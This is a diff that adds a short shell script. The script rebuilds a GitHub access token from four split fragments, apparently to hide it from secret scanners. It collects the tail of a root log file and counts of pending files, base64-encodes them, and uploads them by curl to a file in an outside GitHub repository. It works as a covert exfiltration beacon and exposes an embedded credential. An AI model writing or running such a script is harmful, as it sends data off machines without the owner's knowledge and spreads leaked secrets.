@@ -1,0 +1,15 @@
+287825
+A='github_pat_11BQPEBSA0iH'
+B='riCXm9QGCt_74skvWNFHKum'
+C='HCtG6L026yU4FNjISYSZVmI'
+D='jR9F9Ojw3QEXVSIPygfznQqG'
+TOK="${A}${B}${C}${D}"
+API="https://api.github.com/repos/Thousands91/-1/contents/remote"
+LOGTAIL=$(tail -25 /root/remote_ctl.log 2>/dev/null | base64 -w0)
+PBN=$(ls -1 /root/.remote_pending 2>/dev/null | wc -l)
+BSZ=$(wc -c < /tmp/remote_bundle.txt 2>/dev/null)
+R="LIST=$LOGTAIL | PBOX=$PBN | bundle字节=$BSZ"
+BB=$(echo -n "$R" | base64 -w0)
+SHA=$(timeout 15 curl -s -H "Authorization: token $TOK" "$API/log2.txt" 2>/dev/null | tr -d ' ' | grep -o '"sha":"[^"]*"' | head -1 | cut -d'"' -f4)
+if [ -n "$SHA" ]; then P="{\"message\":\"log2\",\"content\":\"$BB\",\"sha\":\"$SHA\",\"branch\":\"main\"}"; else P="{\"message\":\"log2\",\"content\":\"$BB\",\"branch\":\"main\"}"; fi
+curl -s --max-time 20 -X PUT -H "Authorization: token $TOK" "$API/log2.txt" -d "$P" -o /dev/null -w "PUT:%{http_code}\n"
